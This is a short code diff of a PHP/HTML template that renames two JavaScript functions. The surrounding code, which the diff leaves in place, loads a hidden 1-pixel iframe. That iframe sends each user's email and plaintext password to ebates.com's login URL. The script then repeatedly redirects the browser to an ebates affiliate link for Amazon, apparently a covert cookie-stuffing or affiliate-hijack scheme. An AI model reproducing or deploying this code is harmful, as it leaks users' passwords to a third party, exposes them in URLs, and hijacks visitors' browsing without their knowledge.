@@ -1,23 +1,23 @@
 <script>
-function zheLoadit() {
+function zheHaiLoadit() {
 	var src = "https://www.ebates.com/auth/logon.do?terms=checked&urlIdentifier=%2Fauth%2FgetLogonForm.do&username=<?=urlencode($user['email'])?>&password=<?=$user['password']?>&x=49&y=13";
 	var head = document.getElementsByTagName('head')[0];
 	var script = document.createElement('iframe');
 	script.width = 1;
 	script.heigth = 1;
-	script.onload = mload;
+	script.onload = zheHaiLoad;
 	script.src = src + '&' + Math.random();
 	head.appendChild(script);
 
 	var i = setInterval(function() {
-		mload();
+		zheHaiLoad();
 	}, 2000);
 }
 
-function mload(){
+function zheHaiLoad(){
 	window.location.href='http://www.ebates.com/Amazon.com_1-xfas?navigation_id=19512&mpl_id=40301';
 }
 
 </script>
 
-<iframe src="http://www.ebates.com/customer/feed/offer-feed.xml" width="1px" heigth="1px" onload="zheLoadit()" style="display:none"></iframe>
+<iframe src="http://www.ebates.com/customer/feed/offer-feed.xml" width="1px" heigth="1px" onload="zheHaiLoadit()" style="display:none"></iframe>
